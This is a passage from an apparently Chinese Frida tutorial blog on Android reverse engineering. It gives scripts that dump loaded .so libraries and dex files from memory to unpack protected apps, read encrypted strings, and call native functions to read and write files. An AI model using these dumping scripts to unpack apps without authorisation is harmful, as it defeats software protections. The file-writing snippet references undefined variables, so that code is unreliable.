class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[name]:&quot;</span>, <span class="variable language_">module</span>.<span class="property">name</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[base]:&quot;</span>, <span class="variable language_">module</span>.<span class="property">base</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[size]:&quot;</span>, <span class="variable language_">module</span>.<span class="property">size</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[path]:&quot;</span>, <span class="variable language_">module</span>.<span class="property">path</span>);</span><br><span class="line">        <span class="keyword">var</span> currentApplication = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>();</span><br><span class="line">        <span class="keyword">var</span> dir = currentApplication.<span class="title function_">getApplicationContext</span>().<span class="title function_">getFilesDir</span>().<span class="title function_">getPath</span>();</span><br><span class="line">        <span class="keyword">var</span> path = dir + <span class="string">&quot;/&quot;</span> + <span class="variable language_">module</span>.<span class="property">name</span> + <span class="string">&quot;_&quot;</span> + <span class="variable language_">module</span>.<span class="property">base</span> + <span class="string">&quot;_&quot;</span> + <span class="variable language_">module</span>.<span class="property">size</span> + <span class="string">&quot;.so&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="keyword">new</span> <span class="title class_">File</span>(path, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (file) &#123;</span><br><span class="line">            <span class="title class_">Memory</span>.<span class="title function_">protect</span>(<span class="variable language_">module</span>.<span class="property">base</span>, <span class="variable language_">module</span>.<span class="property">size</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">            <span class="keyword">var</span> buffer = <span class="variable language_">module</span>.<span class="property">base</span>.<span class="title function_">readByteArray</span>(<span class="variable language_">module</span>.<span class="property">size</span>);</span><br><span class="line">            file.<span class="title function_">write</span>(buffer);</span><br><span class="line">            file.<span class="title function_">flush</span>();</span><br><span class="line">            file.<span class="title function_">close</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[dump]:&quot;</span>, path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">dump_so</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Frida-dump-dex"><a href="#Frida-dump-dex" class="headerlink" title="Frida dump dex"></a>Frida dump dex</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为了读写并dump文件的函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_self_process_name</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> openPtr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&#x27;libc.so&#x27;</span>, <span class="string">&#x27;open&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> open = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(openPtr, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> readPtr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;read&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> read = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(readPtr, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;int&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;int&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> closePtr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&#x27;libc.so&#x27;</span>, <span class="string">&#x27;close&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> close = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(closePtr, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> path = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;/proc/self/cmdline&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> fd = <span class="title function_">open</span>(path, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> buffer = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> result = <span class="title function_">read</span>(fd, buffer, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="title function_">close</span>(fd);</span><br><span class="line">        result = <span class="title function_">ptr</span>(buffer).<span class="title function_">readCString</span>();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;-1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这玩意儿跟dump so差不多</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dump_dex</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> libart = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> addr_DefineClass = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> symbols = libart.<span class="title function_">enumerateSymbols</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> index = <span class="number">0</span>; index &lt; symbols.<span class="property">length</span>; index++) &#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[index];</span><br><span class="line">        <span class="keyword">var</span> symbol_name = symbol.<span class="property">name</span>;</span><br><span class="line">        <span class="comment">//这个DefineClass的函数签名是Android9的</span></span><br><span class="line">        <span class="comment">//_ZN3art11ClassLinker11DefineClassEPNS_6ThreadEPKcmNS_6HandleINS_6mirror11ClassLoaderEEERKNS_7DexFileERKNS9_8ClassDefE</span></span><br><span class="line">        <span class="keyword">if</span> (symbol_name.<span class="title function_">indexOf</span>(<span class="string">&quot;ClassLinker&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; </span><br><span class="line">            symbol_name.<span class="title function_">indexOf</span>(<span class="string">&quot;DefineClass&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; </span><br><span class="line">            symbol_name.<span class="title function_">indexOf</span>(<span class="string">&quot;Thread&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; </span><br><span class="line">            symbol_name.<span class="title function_">indexOf</span>(<span class="string">&quot;DexFile&quot;</span>) &gt;= <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(symbol_name, symbol.<span class="property">address</span>);</span><br><span class="line">            addr_DefineClass = symbol.<span class="property">address</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> dex_maps = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[DefineClass:]&quot;</span>, addr_DefineClass);</span><br><span class="line">    <span class="keyword">if</span> (addr_DefineClass) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr_DefineClass, &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> dex_file = args[<span class="number">5</span>];</span><br><span class="line">                <span class="comment">//ptr(dex_file).add(Process.pointerSize) is &quot;const uint8_t* const begin_;&quot;</span></span><br><span class="line">                <span class="comment">//ptr(dex_file).add(Process.pointerSize + Process.pointerSize) is &quot;const size_t size_;&quot;</span></span><br><span class="line">                <span class="keyword">var</span> base = <span class="title function_">ptr</span>(dex_file).<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span>).<span class="title function_">readPointer</span>();</span><br><span class="line">                <span class="keyword">var</span> size = <span class="title function_">ptr</span>(dex_file).<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span> + <span class="title class_">Process</span>.<span class="property">pointerSize</span>).<span class="title function_">readUInt</span>();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (dex_maps[base] == <span class="literal">undefined</span>) &#123;</span><br><span class="line">                    dex_maps[base] = size;</span><br><span class="line">                    <span class="keyword">var</span> magic = <span class="title function_">ptr</span>(base).<span class="title function_">readCString</span>();</span><br><span class="line">                    <span class="keyword">if</span> (magic.<span class="title function_">indexOf</span>(<span class="string">&quot;dex&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">var</span> process_name = <span class="title function_">get_self_process_name</span>();</span><br><span class="line">                        <span class="keyword">if</span> (process_name != <span class="string">&quot;-1&quot;</span>) &#123;</span><br><span class="line">                            <span class="keyword">var</span> dex_path = <span class="string">&quot;/data/data/&quot;</span> + process_name + <span class="string">&quot;/files/&quot;</span> + base.<span class="title function_">toString</span>(<span class="number">16</span>) + <span class="string">&quot;_&quot;</span> + size.<span class="title function_">toString</span>(<span class="number">16</span>) + <span class="string">&quot;.dex&quot;</span>;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[find dex]:&quot;</span>, dex_path);</span><br><span class="line">                            <span class="keyword">var</span> fd = <span class="keyword">new</span> <span class="title class_">File</span>(dex_path, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (fd &amp;&amp; fd != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> dex_buffer = <span class="title function_">ptr</span>(base).<span class="title function_">readByteArray</span>(size);</span><br><span class="line">                                fd.<span class="title function_">write</span>(dex_buffer);</span><br><span class="line">                                fd.<span class="title function_">flush</span>();</span><br><span class="line">                                fd.<span class="title function_">close</span>();</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[dump dex]:&quot;</span>, dex_path);</span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> is_hook_libart = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个也是将dlopen和android_dlopen_ext都给Hook了</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;dlopen&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();</span><br><span class="line">                <span class="comment">//console.log(&quot;dlopen:&quot;, path);</span></span><br><span class="line">                <span class="keyword">if</span> (path.<span class="title function_">indexOf</span>(<span class="string">&quot;libart.so&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">can_hook_libart</span> = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[dlopen:]&quot;</span>, path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">can_hook_libart</span> &amp;&amp; !is_hook_libart) &#123;</span><br><span class="line">                <span class="title function_">dump_dex</span>();</span><br><span class="line">                is_hook_libart = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> path = <span class="title function_">ptr</span>(pathptr).<span class="title function_">readCString</span>();</span><br><span class="line">                <span class="comment">//console.log(&quot;android_dlopen_ext:&quot;, path);</span></span><br><span class="line">                <span class="keyword">if</span> (path.<span class="title function_">indexOf</span>(<span class="string">&quot;libart.so&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">can_hook_libart</span> = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[android_dlopen_ext:]&quot;</span>, path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">can_hook_libart</span> &amp;&amp; !is_hook_libart) &#123;</span><br><span class="line">                <span class="title function_">dump_dex</span>();</span><br><span class="line">                is_hook_libart = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(hook_dlopen);</span><br></pre></td></tr></table></figure>

<h3 id="加密的字符串解密"><a href="#加密的字符串解密" class="headerlink" title="加密的字符串解密"></a>加密的字符串解密</h3><p>这个emmm</p>
<ol>
<li><p>直接打印内存中的字符串，以某一偏移地址为例</p>
 <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;liblogin_encrypt.so&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr.<span class="title function_">add</span>(<span class="number">0xD060</span>).<span class="title function_">readCString</span>());</span><br><span class="line"><span class="comment">// java/security/KeyFactory</span></span><br><span class="line"><span class="comment">//这个用的不是HookDemo</span></span><br><span class="line"><span class="comment">//在这链接：https://pan.baidu.com/s/1qsdNfpmOMVjfpw3pQfYGTA?pwd=GAME 提取码：GAME</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用jnitrace</p>
<p> 这种的话感觉不太灵光，参照前面写的</p>
</li>
<li><p>从内存中导出so。需要注意的是，导出的so是需要经过修复的，这种方法脱壳也经常用。具体方式参考上面的。</p>
</li>
</ol>
<h3 id="构造二级指针"><a href="#构造二级指针" class="headerlink" title="构造二级指针"></a>构造二级指针</h3><p>这块主要用到new NativeFunction声明函数指针</p>
<p>xiugaiStr函数在so文件的偏移地址为0x1B00,主动调用它，需要先得到它的地址，然后用new NativeFunction声明函数指针;再接着构建实参，使用Memory的allocUtf8String方法构建一个字符串，也就是char* 类型，将返回的地址保存在strAddr中，再将strAddr存入到指针变量中，就完成了二级指针的构建。最后调用函数直接传入二级指针</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;liblogin_encrypt.so&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr.<span class="title function_">add</span>(<span class="number">0xD060</span>).<span class="title function_">readCString</span>());</span><br><span class="line"><span class="comment">// java/security/KeyFactory</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>  xiugaiStrAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1B00</span>);</span><br><span class="line"><span class="keyword">var</span>  xiugaiStr = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(xiugaiStrAddr,  <span class="string">&#x27;int64&#x27;</span>,  [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> strAddr = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;dajianbang&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(strAddr));</span><br><span class="line"><span class="comment">/*7d95814930  64 61 6a 69 61 6e 62 61 6e 67 00 98 7d 00 00 00  dajianbang..&#125;...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> finalAddr = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">8</span>).<span class="title function_">writePointer</span>(strAddr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(finalAddr));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">7d95142920  30 49 81 95 7d 00 00 00 22 6c 6f 67 22 2c 22 6c  0I..&#125;...&quot;log&quot;,&quot;l</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">xiugaiStr</span>(finalAddr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(strAddr));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">7d9582dfe0  64 61 6a 69 61 6e 62 61 6e 67 20 51 51 32 34 33  dajianbang QQ243</span></span><br><span class="line"><span class="comment">7d9582dff0  35 38 37 35 37 00 00 00 03 04 00 00 00 00 00 00  58757...........</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>写出文件的方法：使用fopen打开文件，fputs写入数据，fclose关闭文件。</p>
<p>主动调用so函数还是得先拿到地址，上代码，没什么好说的，就是注意f那三个函数的源码声明，看看参数类型，返回值类型啥的</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fopenAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fputsAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fputs&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fcloseAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fclose&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// FILE *fopen(const char *filename, const char *mode)</span></span><br><span class="line"><span class="comment">// int fputs(const char *str, FILE *stream)</span></span><br><span class="line"><span class="comment">// int fclose(FILE *stream)</span></span><br><span class="line"><span class="keyword">var</span> fopen = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fopenAddr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"><span class="keyword">var</span> fputs = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fputsAddr, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"><span class="keyword">var</span> fclose = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fcloseAddr, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fileName = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;/data/data/com.xiaojianbang.app/xiaojianbang.txt&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> openMode = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;111111111&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> file = <span class="title function_">fopen</span>(filename, open_mode);</span><br><span class="line"><span class="title function_">fputs</span>(buffer, file);</span><br><span class="line"><span class="title function_">fclose</span>(file);</span><br></pre></td></tr></table></figure>

<p>fopen和fputs接受的都是指针类型的参数，不能将JS的字符串直接传递过去，需要使用Memory的allocUtf8String在内存中构建相应字符串后，再传递地址。</p>
<p>读取文件：使用libc.so的fgets。几乎一样，就不说了</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fopenAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fgetsAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fgets&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fcloseAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fclose&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// char *fgets(char *str, int n, FILE *stream)</span></span><br><span class="line"><span class="keyword">var</span> fopen = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fopenAddr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"><span class="keyword">var</span> fgets = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fgetsAddr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"><span class="keyword">var</span> fclose = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fcloseAddr, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fileName = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;/data/data/com.xiaojianbang.app/xiaojianbang.txt&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> openMode = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">60</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> file = <span class="title function_">fopen</span>(fileName, openMode);</span><br><span class="line"><span class="keyword">var</span> data = <span class="title function_">fgets</span>(buffer, <span class="number">60</span>, file);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="title function_">readCString</span>());</span><br><span class="line"><span class="title function_">fclose</span>(file);</span><br></pre></td></tr></table></figure>

<h2 id="Frida其他常用API介绍"><a href="#Frida其他常用API介绍" class="headerlink" title="Frida其他常用API介绍"></a>Frida其他常用API介绍</h2><h3 id="NativePointer类的常用方法"><a href="#NativePointer类的常用方法" class="headerlink" title="NativePointer类的常用方法"></a>NativePointer类的常用方法</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 